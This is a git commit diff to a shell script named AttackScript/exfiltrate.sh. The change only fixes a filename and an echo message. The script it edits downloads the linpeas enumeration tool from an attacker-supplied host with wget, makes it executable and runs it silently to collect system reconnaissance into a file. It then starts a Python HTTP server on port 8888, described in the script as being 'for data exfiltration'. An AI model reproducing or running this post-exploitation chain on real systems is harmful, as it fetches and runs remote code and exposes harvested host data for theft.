a53bed9b500c2a8336a0731d37e905ee509d94e2
kahweiing <73683035+kahweiing@users.noreply.github.com>
2022-10-21 01:45:49 +0800

    Update exfiltrate.sh

--- AttackScript/exfiltrate.sh
+++ AttackScript/exfiltrate.sh
@@ -3,6 +3,6 @@ wget http://$1/linpeas.sh;
 echo "giving linpeas execute permission"
 chmod +x linpeas.sh;
 echo "Running linpeas and saving results into result.txt file"
-{ ./linpeas.sh > results.txt; } >/dev/null 2>&1
-echo "Setting up a python server port 8888 for data exfiltration"
+{ ./linpeas.sh > result.txt; } >/dev/null 2>&1
+echo "Setting up a python server at port 8888 for data exfiltration"
 python3 -m http.server 8888;
